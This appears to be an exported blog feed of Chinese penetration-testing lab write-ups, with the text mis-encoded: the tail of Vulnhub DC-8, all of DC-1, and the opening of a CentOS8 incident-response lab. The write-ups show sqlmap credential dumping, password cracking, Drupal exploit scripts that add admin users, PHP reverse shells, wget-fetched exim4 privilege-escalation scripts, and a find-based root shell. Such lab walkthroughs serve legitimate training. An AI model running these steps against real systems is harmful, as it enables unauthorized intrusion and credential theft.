ç®€å•çš„è¿›è¡Œä¸€ä¸ªpostæäº¤ï¼Œæç¤ºæ ¼å¼ä¸æ­£ç¡®ï¼Œæ„Ÿè§‰å¯èƒ½å­˜åœ¨xmlæ³¨å…¥ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203180522820.png" alt="image-20240203180522820"></p><p>ä¸Šç½‘æœç´¢æœ‰å…³xml-rpcæœåŠ¡ç›¸å…³çš„æ¼æ´ï¼Œç¡®å®æœ‰å¾ˆå¤šç›¸å…³æ¼æ´ï¼Œåé¢å¯ä»¥å†è‡ªè¡Œç ”ç©¶ã€‚</p><h3 id="2ã€å‘ç°SQLæ³¨å…¥"><a href="#2ã€å‘ç°SQLæ³¨å…¥" class="headerlink" title="2ã€å‘ç°SQLæ³¨å…¥"></a>2ã€å‘ç°SQLæ³¨å…¥</h3><p>æˆ‘ä»¬ç‚¹å‡»å·¦ä¾§ä¸€ç¯‡æ–‡ç« ä¹‹åï¼Œå‘ç°ä¸Šæ–¹æœ‰ä¸€ä¸ªæœ‰ä¸€ä¸ªå‚æ•°nid</p><p><img src="/img/Vulnhub-DC-8/image-20240203182054064.png" alt="image-20240203182054064"></p><p>åœ¨åŠ ä¸Šä¸€ä¸ªå•å¼•å·â€™ ä¹‹åå‡ºç°æŠ¥é”™ï¼ŒSQLæ³¨å…¥çš„å…¸å‹ç‰¹å¾</p><p><img src="/img/Vulnhub-DC-8/image-20240203182157797.png" alt="image-20240203182157797"></p><p>ä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨sqlmap å»è·‘ï¼Œå¾ˆå¿«å‡ºç°äº†ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.cmd -u &quot;http://192.168.31.58/?nid=1&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203182330160.png" alt="image-20240203182330160"></p><p>ä¹‹åä¸€æ­¥æ­¥å»çˆ†ç ´æ•°æ®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.cmd -u &quot;http://192.168.31.58/?nid=1&quot; --batch -D d7db -T users -C uid,main,name,pass --dump</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203185524761.png" alt="image-20240203185524761"></p><p>çˆ†ç ´å‡ºæ¥ä¸¤ä¸ªè´¦æˆ·ï¼Œå¯†ç ç»è¿‡äº†åŠ å¯†ã€‚</p><h3 id="3ã€ç™»å½•åå°"><a href="#3ã€ç™»å½•åå°" class="headerlink" title="3ã€ç™»å½•åå°"></a>3ã€ç™»å½•åå°</h3><p>å°†è´¦å·å¯†ç ä¿å­˜ä¸‹æ¥ï¼Œç”¨john ç ´è§£å·¥å…·ç ´è§£è´¦å·å¯†ç ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203190028515.png" alt="image-20240203190028515"></p><p>johnè´¦å·çš„å¯†ç å¾ˆå¿«å°±èƒ½ç ´è§£å‡ºæ¥</p><p><img src="/img/Vulnhub-DC-8/image-20240203190132333.png" alt="image-20240203190132333"></p><p>é‚£æˆ‘ä»¬å…ˆç™»å½•john çš„è´¦å·ï¼ˆåœ¨ä¹‹å‰çš„webç›®å½•æ‰«æä¸­çŸ¥é“ç™»å½•çš„åå°åœ°å€&#x2F;user&#x2F;loginï¼‰</p><p><img src="/img/Vulnhub-DC-8/image-20240203190525466.png" alt="image-20240203190525466"></p><p>æˆåŠŸç™»å½•åå°ã€‚</p><h3 id="4ã€åå¼¹shell"><a href="#4ã€åå¼¹shell" class="headerlink" title="4ã€åå¼¹shell"></a>4ã€åå¼¹shell</h3><p>åœ¨Drupal åå°ä¸­æœ‰ä¸€ä¸ªå¯ä»¥æ‰§è¡Œphpä»£ç çš„åœ°æ–¹ï¼Œæ˜¯è¿™ä¸ªæ¡†æ¶çš„ä¸€ä¸ªå¿…é¡»çš„æ£€æµ‹ç‚¹ã€‚</p><p>åœ¨å¦‚ä¸‹çš„è¿™ä¸ªåœ°æ–¹ï¼š</p><p><img src="/img/Vulnhub-DC-8/image-20240203190705884.png" alt="image-20240203190705884"></p><p>å¦‚ä¸‹åˆ‡æ¢æˆphpä»£ç ã€‚æ˜¯ä¸€ä¸ªæäº¤æ„è§ä¹‹åçš„æ„Ÿè°¢è¯­ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203190749203.png" alt="image-20240203190749203"></p><p>åœ¨æˆ‘ä»¬çš„shellåå¼¹ç½‘ç«™ä¸­æ‰¾ä¸€ä¸ªphpshellåå¼¹çš„ä»£ç ï¼Œç²˜è´´ä¸Šå»ååœ¨ä¸‹æ–¹ä¿å­˜ï¼Œå¹¶ç›‘å¬æœ¬åœ°çš„4444ç«¯å£ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203190947064.png" alt="image-20240203190947064"></p><p><img src="/img/Vulnhub-DC-8/image-20240203191049849.png" alt="image-20240203191049849"></p><p>ä¹‹åè¿”å›ï¼Œå»å†™ä¸€ä¸ªæ„è§æäº¤ï¼Œæ‹¿åˆ°shellã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240203191205010.png" alt="image-20240203191205010"></p><p>è¿™é‡Œå¦‚æœå¤±è´¥å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œé€€å‡ºç™»å½•ã€åˆ·æ–°é¡µé¢ç­‰ï¼ˆæœ€å¥½åœ¨ä¸€ä¸ªé¡µé¢ä¸Šæ“ä½œï¼‰</p><p><img src="/img/Vulnhub-DC-8/image-20240203192429966.png" alt="image-20240203192429966"></p><h1 id="å››ã€ææƒè‡³root"><a href="#å››ã€ææƒè‡³root" class="headerlink" title="å››ã€ææƒè‡³root"></a>å››ã€ææƒè‡³root</h1><h3 id="1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶"><a href="#1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶" class="headerlink" title="1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶"></a>1ã€æŸ¥æ‰¾SUIDæ–‡ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203192842506.png" alt="image-20240203192842506"></p><p>å¯ä»¥çœ‹åˆ°exim4ï¼Œä½ç‰ˆæœ¬çš„exim4æ˜¯å¯ä»¥ææƒçš„ã€‚</p><p>æŸ¥çœ‹exim4çš„ç‰ˆæœ¬ä¿¡æ¯ï¼š4.89ç¡®è®¤åœ¨å¯ææƒçš„ç‰ˆæœ¬èŒƒå›´å†…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203193259469.png" alt="image-20240203193259469"></p><h3 id="2ã€exim4ææƒ"><a href="#2ã€exim4ææƒ" class="headerlink" title="2ã€exim4ææƒ"></a>2ã€exim4ææƒ</h3><p>1ã€æŸ¥æ‰¾å¯æœ¬åœ°ææƒè„šæœ¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd exim 4 | findstr Local#é€šè¿‡findstr Localè¿›è¡Œç­›é€‰</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203193518182.png" alt="image-20240203193518182"></p><p>2ã€æŸ¥çœ‹è„šæœ¬çš„åˆ©ç”¨æ–¹å¼</p><p>æˆ‘ä»¬å¯ä»¥åœ¨å³ä¾§æ‰¾åˆ°searchsploitè¿™ä¸ªå·¥å…·ï¼ŒåŒå‡»è¿›å»å®ƒçš„ç›®å½•ï¼Œæ‰¾åˆ°è¿™ä¸ªè„šæœ¬å¹¶å¤åˆ¶å‡ºæ¥ã€‚</p><p><img src="/img/Vulnhub-DC-8/image-20240204142529937.png" alt="image-20240204142529937"></p><p><img src="/img/Vulnhub-DC-8/image-20240204142649690.png" alt="image-20240204142649690"></p><p>è¿›è¡Œå¤åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp exploits/linux/local/46996.sh /c/Users/Administrator/Desktop/test/</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240204142735747.png" alt="image-20240204142735747"></p><p>å›åˆ°windowsä¸­ç”¨sublimeæ¥æ‰“å¼€è¯¥è„šæœ¬</p><p><img src="/img/Vulnhub-DC-8/image-20240203193852694.png" alt="image-20240203193852694"></p><p>3ã€è§£æè¯¥è„šæœ¬</p><p>å¦‚æœä¸æ‡‚shè„šæœ¬çš„ä»£ç ï¼Œå¯ä»¥ç›´æ¥è®©gptè¿›è¡Œåˆ†æ</p><p><img src="/img/Vulnhub-DC-8/image-20240203194141404.png" alt="image-20240203194141404"></p><p>ç®€è€Œè¨€ä¹‹ï¼Œè¯¥è„šæœ¬æœ‰ä¸¤ä¸ªåˆ©ç”¨æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m setuid</span><br><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure><h3 id="3ã€ææƒè‡³root"><a href="#3ã€ææƒè‡³root" class="headerlink" title="3ã€ææƒè‡³root"></a>3ã€ææƒè‡³root</h3><p>1ã€å°†è¯¥è„šæœ¬ä¸Šä¼ è‡³é¶æœºï¼Œæœ¬åœ°å¼€å¯httpæœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>2ã€åœ¨é¶æœºçš„&#x2F;tmp ç›®å½•ä¸‹è¿›è¡Œä¸‹è½½ï¼Œ&#x2F;tmpç›®å½•ä»»ä½•äººéƒ½æœ‰ä¸‹è½½æ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.31.50:8000/46996.sh</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203194428286.png" alt="image-20240203194428286"></p><p>3ã€ç»™è¯¥è„šæœ¬æ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure><p>4ã€æ‰§è¡Œææƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m netcat#ææƒæˆåŠŸ</span><br><span class="line">shell=/bin/bash script -q /dev/null#è¿›å…¥äº¤äº’shell</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-8/image-20240203194645289.png" alt="image-20240203194645289"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Vulnhubç³»åˆ—ã€‘Vulnhubé¶åœº_DC-1</title>
      <link href="/2024/02/15/Vulnhub-DC-1/"/>
      <url>/2024/02/15/Vulnhub-DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-DC-1é¶åœºæ¸—é€"><a href="#ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub-DC-1é¶åœºæ¸—é€" class="headerlink" title="ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_DC-1é¶åœºæ¸—é€"></a>ã€Vulnhubç³»åˆ—é¶åœºã€‘Vulnhub_DC-1é¶åœºæ¸—é€</h1><h1 id="ä¸€ã€ç¯å¢ƒå‡†å¤‡"><a href="#ä¸€ã€ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ä¸€ã€ç¯å¢ƒå‡†å¤‡"></a>ä¸€ã€ç¯å¢ƒå‡†å¤‡</h1><p>1ã€åœ¨ç™¾åº¦ç½‘ç›˜ä¸­ä¸‹è½½DC-1é¶åœºã€‚DC-1é¶åœºå—virtual box çš„å½±å“ï¼Œåœ¨VMä¸­ç›´æ¥æ‰“å¼€æ˜¯æ‰«æä¸åˆ°IP çš„ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼š<a href="/2024/04/13/Extracurricular-experience-Vulnhub-IP-correct/" title="ã€å…¶ä»–ç»éªŒã€‘Vulnhubé¶æœºæ‰«æä¸åˆ°IP">ã€å…¶ä»–ç»éªŒã€‘Vulnhubé¶æœºæ‰«æä¸åˆ°IP</a></p><p>2ã€ä¹‹ååœ¨VMä¸­æ‰“å¼€.ovf æ–‡ä»¶ï¼Œè®¾ç½®å­˜å‚¨è·¯å¾„å’Œä»»æ„åç§°</p><p>3ã€å¼€æœºä¹‹åä¿®æ”¹ç½‘ç»œè¿æ¥æ¨¡å¼ä¸ºã€NATã€‘å³å¯</p><h1 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h1><h3 id="1ã€ä¸»æœºå‘ç°"><a href="#1ã€ä¸»æœºå‘ç°" class="headerlink" title="1ã€ä¸»æœºå‘ç°"></a>1ã€ä¸»æœºå‘ç°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sn 192.168.31.*</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215190004853.png" alt="image-20240215190004853"></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p>1ã€ç²—ç•¥å¿«é€Ÿæ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.64</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215190129699.png" alt="image-20240215190129699"></p><p>2ã€ç²¾ç»†åŒ–æ‰«æ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT --min-rate 10000 -p- 192.168.31.64</span><br><span class="line">nmap.exe -sU --min-rate 10000 -p- 192.168.31.64</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215193134231.png" alt="image-20240215193134231"></p><p><img src="/img/Vulnhub-DC-1/image-20240215193153578.png" alt="image-20240215193153578"></p><p>3ã€å…¨æ‰«æå’Œæ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p22,80,111,45384,46146 192.168.31.64</span><br><span class="line">nmap.exe --script=vuln -p22,80,111,45384,46146 192.168.31.64</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215193925495.png" alt="image-20240215193925495"></p><p>Debian æ“ä½œç³»ç»Ÿ</p><p><img src="/img/Vulnhub-DC-1/image-20240215194229531.png" alt="image-20240215194229531"></p><p> 80ç«¯å£å‘ç°ï¼šcve2014-3704æ¼æ´ã€csrf å’Œä¸€äº›æ•æ„Ÿè·¯å¾„</p><h3 id="3ã€webç›®å½•æ¢æµ‹"><a href="#3ã€webç›®å½•æ¢æµ‹" class="headerlink" title="3ã€webç›®å½•æ¢æµ‹"></a>3ã€webç›®å½•æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch.cmd -u http://192.168.31.64 -x 404,403</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215195553109.png" alt="image-20240215195553109"></p><h3 id="4ã€webæ¡†æ¶æ¢æµ‹"><a href="#4ã€webæ¡†æ¶æ¢æµ‹" class="headerlink" title="4ã€webæ¡†æ¶æ¢æµ‹"></a>4ã€webæ¡†æ¶æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://192.168.31.64#åœ¨kaliä¸­ä½¿ç”¨</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215200000848.png" alt="image-20240215200000848"></p><p>ä½¿ç”¨äº†Drupal 7çš„æ¡†æ¶</p><h1 id="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"><a href="#ä¸‰ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="ä¸‰ã€è·å–shellç«‹è¶³ç‚¹"></a>ä¸‰ã€è·å–shellç«‹è¶³ç‚¹</h1><h3 id="1ã€cve2014-3704-SQLæ³¨å…¥"><a href="#1ã€cve2014-3704-SQLæ³¨å…¥" class="headerlink" title="1ã€cve2014-3704 SQLæ³¨å…¥"></a>1ã€cve2014-3704 SQLæ³¨å…¥</h3><p>è®¿é—®ç½‘ç«™ï¼Œç¡®å®æ˜¯ä¸€ä¸ªDrupal 7 æ¡†æ¶çš„ç½‘ç«™</p><p><img src="/img/Vulnhub-DC-1/image-20240215200945203.png" alt="image-20240215200945203"></p><p>æ ¹æ®nmap æ¢æµ‹å‡ºæ¥çš„cve2014-3704 ï¼Œåœ¨æ¼æ´åº“ä¸­è¿›è¡ŒæŸ¥è¯¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¼æ´å½±å“ï¼šDrupal 7.0~7.31</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215201224514.png" alt="image-20240215201224514"></p><p>æˆ‘ä»¬ç›´æ¥å°†è¿™ä¸ªæ•°æ®åŒ…è¿›è¡Œä¿å­˜ï¼Œä¿®æ”¹Host ä¸ºé¶æœºåœ°å€ï¼ŒæŠ“åŒ…é‡æ”¾</p><p><img src="/img/Vulnhub-DC-1/image-20240215204441344.png" alt="image-20240215204441344"></p><p>åˆ©ç”¨æˆåŠŸï¼Œå­˜åœ¨SQLæ³¨å…¥</p><h3 id="2ã€ç™»å½•åå°"><a href="#2ã€ç™»å½•åå°" class="headerlink" title="2ã€ç™»å½•åå°"></a>2ã€ç™»å½•åå°</h3><p>æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªSQLæ¼æ´è¿›è¡Œæ‰‹å·¥æ³¨å…¥å¤ªè¿‡äºéº»çƒ¦ï¼Œæˆ‘ä»¬å»searchsploit ä¸Šæœç´¢æœ‰å…³Drupal 7 çš„ç›¸å…³æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit.cmd Drupal 7</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215212739190.png" alt="image-20240215212739190"></p><p>æœ‰å››ä¸ªç¬¦åˆç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŒ¨ä¸ªå°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp exploits/php/webapps/34992.py /c/Users/Administrator/Desktop/test/</span><br></pre></td></tr></table></figure><p>1ã€ç¬¬ä¸€ä¸ªæ˜¯ç›´æ¥æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·çš„pyè„šæœ¬ï¼š34992.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 34992.py -t http://192.168.31.64 -u admin123 -p admin123</span><br><span class="line">#æ·»åŠ ä¸€ä¸ªè´¦å·å¯†ç å‡ä¸ºadmin123çš„ç®¡ç†å‘˜</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240215212853269.png" alt="image-20240215212853269"></p><p><img src="/img/Vulnhub-DC-1/image-20240215213029437.png" alt="image-20240215213029437"></p><p>ç”¨<code>admin123:admin123</code>ç™»å½•åå°</p><p><img src="/img/Vulnhub-DC-1/image-20240215213315976.png" alt="image-20240215213315976"></p><p>IPè¢«åŠ å…¥é»‘åå•äº†ï¼Œæˆ‘è¯´æ€ä¹ˆç™»å½•ä¸äº†ï¼Œæˆ‘ä»¬ç¨ç­‰ç‰‡åˆ»ã€‚ä¹‹åæ¢äº†<code>admin1234:admin1234</code>ï¼Œæç¤ºè´¦å·æœªæ¿€æ´»ä¸èƒ½ä½¿ç”¨ã€‚</p><p><img src="/img/Vulnhub-DC-1/image-20240216184714618.png" alt="image-20240216184714618"></p><p>2ã€æˆ‘ä»¬å°è¯•ç¬¬å››ä¸ªphpè„šæœ¬ï¼š34993.php</p><p>ä¿®æ”¹æˆ‘ä»¬çš„é¶æœºåœ°å€</p><p><img src="/img/Vulnhub-DC-1/image-20240216194806747.png" alt="image-20240216194806747"></p><p>ä¹‹åæ‰§è¡Œ</p><p><img src="/img/Vulnhub-DC-1/image-20240216194833054.png" alt="image-20240216194833054"></p><p>ä¹‹åç”¨<code>admin:admin</code>è¿›è¡Œç™»å½•</p><p><img src="/img/Vulnhub-DC-1/image-20240216195221938.png" alt="image-20240216195221938"></p><p>æˆåŠŸç™»å½•åå°</p><h3 id="3ã€è·å–shellç«‹è¶³ç‚¹"><a href="#3ã€è·å–shellç«‹è¶³ç‚¹" class="headerlink" title="3ã€è·å–shellç«‹è¶³ç‚¹"></a>3ã€è·å–shellç«‹è¶³ç‚¹</h3><p>åœ¨åå°æ¨¡å—ä¸­å¼€å¯PHPä»£ç </p><p><img src="/img/Vulnhub-DC-1/image-20240216201525764.png" alt="image-20240216201525764"></p><p>è¿›è¡Œä¿å­˜ï¼Œæç¤ºæˆåŠŸ</p><p><img src="/img/Vulnhub-DC-1/image-20240216201653827.png" alt="image-20240216201653827"></p><p>æˆ‘ä»¬éšä¾¿æ‰¾ä¸€ç¯‡æ–‡ç« è¿›è¡Œä¿®æ”¹</p><p><img src="/img/Vulnhub-DC-1/image-20240216201907601.png" alt="image-20240216201907601"></p><p>é€‰æ‹©PHPä»£ç </p><p><img src="/img/Vulnhub-DC-1/image-20240216201934513.png" alt="image-20240216201934513"></p><p>æ·»åŠ ä¸ŠPHPåå¼¹shellä»£ç </p><p><img src="/img/Vulnhub-DC-1/image-20240216202351688.png" alt="image-20240216202351688"></p><p>ç”¨nc æˆåŠŸæ¥æ”¶åˆ°shell</p><p><img src="/img/Vulnhub-DC-1/image-20240216202503815.png" alt="image-20240216202503815"></p><h1 id="å››ã€ææƒè‡³root"><a href="#å››ã€ææƒè‡³root" class="headerlink" title="å››ã€ææƒè‡³root"></a>å››ã€ææƒè‡³root</h1><h3 id="1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>1ã€æ•æ„Ÿä¿¡æ¯æ”¶é›†</h3><p>1ã€wwwä¸‹çš„sites&#x2F;default&#x2F;settings.php æ•°æ®åº“é…ç½®æ–‡ä»¶</p><p>drupaldbæ•°æ®åº“çš„è´¦å·å¯†ç ï¼šdbuser:R0ck3t</p><p><img src="/img/Vulnhub-DC-1/image-20240216203650477.png" alt="image-20240216203650477"></p><p>2ã€&#x2F;etc&#x2F;passwd æ–‡ä»¶</p><p>å­˜åœ¨flag4 è¿™ä¸ªç”¨æˆ·</p><p><img src="/img/Vulnhub-DC-1/image-20240216204206491.png" alt="image-20240216204206491"></p><p>3ã€flag4.txt æ–‡ä»¶</p><p><img src="/img/Vulnhub-DC-1/image-20240216204341256.png" alt="image-20240216204341256"></p><h3 id="2ã€findé«˜æƒé™ææƒ"><a href="#2ã€findé«˜æƒé™ææƒ" class="headerlink" title="2ã€findé«˜æƒé™ææƒ"></a>2ã€findé«˜æƒé™ææƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾é«˜æƒé™å‘½ä»¤</p><p><img src="/img/Vulnhub-DC-1/image-20240216205000230.png" alt="image-20240216205000230"></p><h3 id="3ã€ææƒè‡³root"><a href="#3ã€ææƒè‡³root" class="headerlink" title="3ã€ææƒè‡³root"></a>3ã€ææƒè‡³root</h3><p>é‡‡ç”¨find è¿›è¡Œææƒï¼ŒæˆåŠŸæ‹¿åˆ°rootæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="/img/Vulnhub-DC-1/image-20240216205312662.png" alt="image-20240216205312662"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhubç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åº”æ€¥é¶åœºã€‘Centos8å…¥ä¾µæ’æŸ¥ã€å“åº”åŠ å›º</title>
      <link href="/2024/02/15/Emergency-Centos8/"/>
      <url>/2024/02/15/Emergency-Centos8/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos8-çˆ†ç ´ã€åé—¨ã€å‘½ä»¤æ›¿æ¢äº‹ä¾‹"><a href="#Centos8-çˆ†ç ´ã€åé—¨ã€å‘½ä»¤æ›¿æ¢äº‹ä¾‹" class="headerlink" title="Centos8 çˆ†ç ´ã€åé—¨ã€å‘½ä»¤æ›¿æ¢äº‹ä¾‹"></a>Centos8 çˆ†ç ´ã€åé—¨ã€å‘½ä»¤æ›¿æ¢äº‹ä¾‹</h1><h1 id="ä¸€ã€ç¯å¢ƒé…ç½®"><a href="#ä¸€ã€ç¯å¢ƒé…ç½®" class="headerlink" title="ä¸€ã€ç¯å¢ƒé…ç½®"></a>ä¸€ã€ç¯å¢ƒé…ç½®</h1><ol><li><p>åœ¨ç™¾åº¦ç½‘ç›˜ä¸‹è½½Centos8åº”æ€¥å“åº”é¶æœºå¹¶åœ¨vmæ‰“å¼€ã€‚é¦–å…ˆè·å–é¶æœºçš„æ‰€æœ‰æƒ</p><p><img src="/img/Emergency-Centos8/image-20240127133316802.png" alt="image-20240127133316802"></p></li><li><p>ä¹‹åè¿è¡Œé¶æœºå¹¶é€‰æ‹©å·²ç»å¤åˆ¶é¶æœºï¼Œä¹‹åé€‰æ‹©æ”¾å¼ƒï¼Œè¿™æ˜¯å› ä¸ºæ²¡æœ‰å¯¹åº”çš„isoæ–‡ä»¶é€ æˆçš„ã€‚</p><p><img src="/img/Emergency-Centos8/image-20240127133448284.png" alt="image-20240127133448284"></p></li><li><p>ä¹‹åé‡æ–°è¿è¡Œé¶æœºå³å¯ã€‚</p><p><img src="/img/Emergency-Centos8/image-20240127133553758.png" alt="image-20240127133553758"></p></li><li><p>ä»¥zyr ç”¨æˆ·çš„æƒé™è¿›å…¥ï¼Œå¯†ç 123456</p></li></ol><h1 id="äºŒã€å…¥ä¾µæ’æŸ¥"><a href="#äºŒã€å…¥ä¾µæ’æŸ¥" class="headerlink" title="äºŒã€å…¥ä¾µæ’æŸ¥"></a>äºŒã€å…¥ä¾µæ’æŸ¥</h1><h3 id="1ã€ç½‘ç»œæ’æŸ¥"><a href="#1ã€ç½‘ç»œæ’æŸ¥" class="headerlink" title="1ã€ç½‘ç»œæ’æŸ¥"></a>1ã€ç½‘ç»œæ’æŸ¥</h3><p>å½“æˆ‘ä»¬ç¡®å®šè¯¥æœºå™¨å·²ç»è¢«å…¥ä¾µä¹‹åï¼Œé€šå¸¸å…ˆçœ‹ä¸€ä¸‹ç½‘ç»œè¿æ¥æƒ…å†µï¼Œåˆ‡æ–­æœºå™¨ä¸å¤–ç•Œçš„ç½‘ç»œè¿æ¥ï¼Œé˜²æ­¢å±å®³ç»§ç»­æ‰©å¤§ã€‚</p><p>æˆ‘ä»¬åœ¨centos8å·¦ä¸Šè§’çš„æ´»åŠ¨è°ƒç”¨ç»ˆç«¯ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤è¿›è¡ŒæŸ¥çœ‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-Centos8/image-20240127134155940.png" alt="image-20240127134155940"></p><p>ç›®å‰å› 